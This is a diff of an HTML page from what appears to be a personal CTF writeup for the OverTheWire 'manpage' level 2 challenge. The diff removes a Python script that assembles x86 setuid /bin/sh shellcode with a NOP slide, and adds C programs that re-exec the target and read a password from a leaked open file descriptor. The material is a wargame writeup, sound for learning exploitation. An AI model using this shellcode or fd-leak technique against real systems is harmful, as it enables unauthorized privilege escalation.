@@ -4,8 +4,15 @@
     <meta charset='utf-8'>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=b7c7ae198d0c0d5b433ba2f5ba28241351a2fd21">
-    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=429416b0fbd88183bc1fba2235ca959bf77e17b2">
+    
+<link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+
+<!-- remove the cache headers -->
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+
 
 <!-- Begin Jekyll SEO tag v2.8.0 -->
 <title>manpage2 | Avishai’s CTF Writeups</title>
@@ -46,197 +53,44 @@
       <section id="main_content">
         <p>in this level we can exploit the fact it leaves the file open, and also we can execute our code using the last line that reruns the file, with <code class="language-plaintext highlighter-rouge">excel</code>.</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span>
-
-<span class="n">NOP_SLIDE</span> <span class="o">=</span> <span class="mi">50</span>
-
-<span class="k">print</span> <span class="o">=</span> <span class="k">lambda</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">:</span> <span class="bp">None</span> <span class="c1"># override print function
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
 </span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Usage: %s &lt;input&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
 
-<span class="c1"># setreuid(geteuid(), geteuid())
-# execv("/bin//sh", argv)
-</span>
-<span class="c1"># Shellcode in Python
-</span><span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span>
-    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x31</span><span class="s">"</span>  <span class="c1"># push 0x31 (49)
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x58</span><span class="s">"</span>      <span class="c1"># pop eax
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80 (geteuid())
-</span>
-    <span class="sa">b</span><span class="s">"</span><span class="se">\x40</span><span class="s">"</span>      <span class="c1"># inc eax
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xc3</span><span class="s">"</span>  <span class="c1"># mov ebx, eax (uid + 1)
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x17</span><span class="s">"</span>  <span class="c1"># push 0x17 (23)
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x58</span><span class="s">"</span>      <span class="c1"># pop eax
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80, setuid16(uid + 1)
-</span>
-    <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xd9</span><span class="s">"</span>  <span class="c1"># mov ecx, ebx
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x46</span><span class="s">"</span>  <span class="c1"># push 0x46 (70)
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x58</span><span class="s">"</span>      <span class="c1"># pop eax
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80, setreuid(uid + 1, uid + 1)
-</span>
-    <span class="sa">b</span><span class="s">"</span><span class="se">\x31\xd2</span><span class="s">"</span>  <span class="c1"># xor edx, edx
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x52</span><span class="s">"</span>      <span class="c1"># push edx, which is \0
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x68\x2f\x2f\x73\x68</span><span class="s">"</span>  <span class="c1"># push "//sh"
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x68\x2f\x62\x69\x6e</span><span class="s">"</span>  <span class="c1"># push "/bin"
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xe3</span><span class="s">"</span>  <span class="c1"># mov ebx, esp (now ebx contains: "/bin//sh",\x00)
-</span>
-    <span class="sa">b</span><span class="s">"</span><span class="se">\x52</span><span class="s">"</span>      <span class="c1"># push edx (push NULL into stack)
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x53</span><span class="s">"</span>      <span class="c1"># push ebx (push pathname)
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xe1</span><span class="s">"</span>  <span class="c1"># mov ecx, esp (ecx is argv)
-</span>
-    <span class="sa">b</span><span class="s">"</span><span class="se">\xb0\x0b</span><span class="s">"</span>  <span class="c1"># mov al, 0x0b (11)
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80 (execv("/bin//sh", argv))
-</span>
-        <span class="c1"># mv eax, 1         ; system call number (sys_exit)
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x01</span><span class="s">"</span>  <span class="c1"># push 1
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x58</span><span class="s">"</span>      <span class="c1"># pop eax (sys_exit)
-</span>    <span class="c1"># int 0x80
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80 (exit())
-</span><span class="p">)</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">pathname</span> <span class="o">=</span> <span class="s">"/manpage/manpage2"</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">new_argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">};</span>
+    <span class="n">execv</span><span class="p">(</span><span class="n">pathname</span><span class="p">,</span> <span class="n">new_argv</span><span class="p">);</span>
 
-<span class="c1"># Print shellcode details
-</span><span class="k">print</span><span class="p">(</span><span class="s">"Shellcode code is:"</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="s">"setreuid(geteuid(), geteuid())"</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="s">"execv(</span><span class="se">\"</span><span class="s">/bin//sh</span><span class="se">\"</span><span class="s">, argv)"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="c1">// gcc -m32 level2.c -o level2</span>
 
-<span class="c1"># Print shellcode with NOP slide
-</span><span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Shellcode as formatted string:"</span><span class="p">)</span>
-
-<span class="c1"># Add NOP slide (\x90) before shellcode
-</span><span class="n">nop_slide</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="n">NOP_SLIDE</span>
-<span class="n">formatted_shellcode</span> <span class="o">=</span> <span class="n">nop_slide</span> <span class="o">+</span> <span class="n">shellcode</span>
-
-<span class="c1"># Convert to formatted string
-</span><span class="n">formatted_string</span> <span class="o">=</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\\</span><span class="s">x</span><span class="si">{</span><span class="n">byte</span><span class="si">:</span><span class="mi">02</span><span class="n">x</span><span class="si">}</span><span class="s">"</span> <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">formatted_shellcode</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">formatted_string</span><span class="p">)</span>
-
-<span class="c1"># Print shellcode in hex format
-</span><span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Shellcode in hex format:"</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">byte</span><span class="si">:</span><span class="mi">02</span><span class="n">x</span><span class="si">}</span><span class="s">"</span> <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">formatted_shellcode</span><span class="p">))</span>
-
-<span class="c1"># Calculate shellcode length
-</span><span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">Length of shellcode is </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">formatted_shellcode</span><span class="p">)</span><span class="si">}</span><span class="s"> bytes"</span><span class="p">)</span>
-
-<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">formatted_shellcode</span><span class="p">)</span>
-<span class="c1"># export SHELLCODE=$(python3 shellcode.py)
-</span>
 </code></pre></div></div>
-<!--
- ```c
-#include<stdio.h>
-#include<unistd.h>
-
-int main(int argc, char *argv[]) {
-    if(argc < 2) {
-        printf("Usage: %s <input>\n", argv[0]);
-        return 1;
-    }
-
-    char *pathname = "/manpage/manpage2";
-    char *new_argv[] = {argv[1], NULL};
-    execv(pathname, new_argv);
-
-    return 0;
-}
-// gcc -m32 level2.c -o level2
-
-```
-```c
-#include<stdio.h>
-
-int main(){
-    int fd = 3;
-    char pass[32];
-
-    if(lseek(fd, 0, 0) == -1){
-        printf("Error: lseek failed\n");
-        return 1;
-    }
-    if(read(fd, pass, 32) == -1){
-        printf("Error: read failed\n");
-        return 1;
-    }
-
-    printf("Password: %s\n", pass);
-    return 0;
-}
-// gcc -m32 read_pass.c -o read_pass
-
-```
- -->
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span>
-
-<span class="n">NOP_SLIDE</span> <span class="o">=</span> <span class="mi">50</span>
-
-<span class="k">print</span> <span class="o">=</span> <span class="k">lambda</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">:</span> <span class="bp">None</span> <span class="c1"># override print function
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 </span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">pass</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
 
-<span class="c1"># setreuid(geteuid(), geteuid())
-# execv("/bin//sh", argv)
-</span>
-<span class="c1"># Shellcode in Python
-</span><span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span>
-    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x31</span><span class="s">"</span>  <span class="c1"># push 0x31 (49)
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x58</span><span class="s">"</span>      <span class="c1"># pop eax
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80 (geteuid())
-</span>
-    <span class="sa">b</span><span class="s">"</span><span class="se">\x40</span><span class="s">"</span>      <span class="c1"># inc eax
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xc3</span><span class="s">"</span>  <span class="c1"># mov ebx, eax (uid + 1)
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x17</span><span class="s">"</span>  <span class="c1"># push 0x17 (23)
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x58</span><span class="s">"</span>      <span class="c1"># pop eax
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80, setuid16(uid + 1)
-</span>
-    <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xd9</span><span class="s">"</span>  <span class="c1"># mov ecx, ebx
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x46</span><span class="s">"</span>  <span class="c1"># push 0x46 (70)
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x58</span><span class="s">"</span>      <span class="c1"># pop eax
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80, setreuid(uid + 1, uid + 1)
-</span>
-    <span class="sa">b</span><span class="s">"</span><span class="se">\x31\xd2</span><span class="s">"</span>  <span class="c1"># xor edx, edx
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x52</span><span class="s">"</span>      <span class="c1"># push edx, which is \0
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x68\x2f\x2f\x73\x68</span><span class="s">"</span>  <span class="c1"># push "//sh"
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x68\x2f\x62\x69\x6e</span><span class="s">"</span>  <span class="c1"># push "/bin"
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xe3</span><span class="s">"</span>  <span class="c1"># mov ebx, esp (now ebx contains: "/bin//sh",\x00)
-</span>
-    <span class="sa">b</span><span class="s">"</span><span class="se">\x52</span><span class="s">"</span>      <span class="c1"># push edx (push NULL into stack)
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x53</span><span class="s">"</span>      <span class="c1"># push ebx (push pathname)
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xe1</span><span class="s">"</span>  <span class="c1"># mov ecx, esp (ecx is argv)
-</span>
-    <span class="sa">b</span><span class="s">"</span><span class="se">\xb0\x0b</span><span class="s">"</span>  <span class="c1"># mov al, 0x0b (11)
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80 (execv("/bin//sh", argv))
-</span>
-        <span class="c1"># mv eax, 1         ; system call number (sys_exit)
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x01</span><span class="s">"</span>  <span class="c1"># push 1
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x58</span><span class="s">"</span>      <span class="c1"># pop eax (sys_exit)
-</span>    <span class="c1"># int 0x80
-</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80 (exit())
-</span><span class="p">)</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Error: lseek failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">pass</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Error: read failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
 
-<span class="c1"># Print shellcode details
-</span><span class="k">print</span><span class="p">(</span><span class="s">"Shellcode code is:"</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="s">"setreuid(geteuid(), geteuid())"</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="s">"execv(</span><span class="se">\"</span><span class="s">/bin//sh</span><span class="se">\"</span><span class="s">, argv)"</span><span class="p">)</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Password: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pass</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="c1">// gcc -m32 read_pass.c -o read_pass</span>
 
-<span class="c1"># Print shellcode with NOP slide
-</span><span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Shellcode as formatted string:"</span><span class="p">)</span>
-
-<span class="c1"># Add NOP slide (\x90) before shellcode
-</span><span class="n">nop_slide</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="n">NOP_SLIDE</span>
-<span class="n">formatted_shellcode</span> <span class="o">=</span> <span class="n">nop_slide</span> <span class="o">+</span> <span class="n">shellcode</span>
-
-<span class="c1"># Convert to formatted string
-</span><span class="n">formatted_string</span> <span class="o">=</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\\</span><span class="s">x</span><span class="si">{</span><span class="n">byte</span><span class="si">:</span><span class="mi">02</span><span class="n">x</span><span class="si">}</span><span class="s">"</span> <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">formatted_shellcode</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">formatted_string</span><span class="p">)</span>
-
-<span class="c1"># Print shellcode in hex format
-</span><span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Shellcode in hex format:"</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">byte</span><span class="si">:</span><span class="mi">02</span><span class="n">x</span><span class="si">}</span><span class="s">"</span> <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">formatted_shellcode</span><span class="p">))</span>
-
-<span class="c1"># Calculate shellcode length
-</span><span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">Length of shellcode is </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">formatted_shellcode</span><span class="p">)</span><span class="si">}</span><span class="s"> bytes"</span><span class="p">)</span>
-
-<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">formatted_shellcode</span><span class="p">)</span>
-<span class="c1"># export SHELLCODE=$(python3 shellcode.py)
-</span>
 </code></pre></div></div>
 
 <p><img src="/CTF_writeups/overthewire/manpage/images/level2.png" alt="image" /></p>
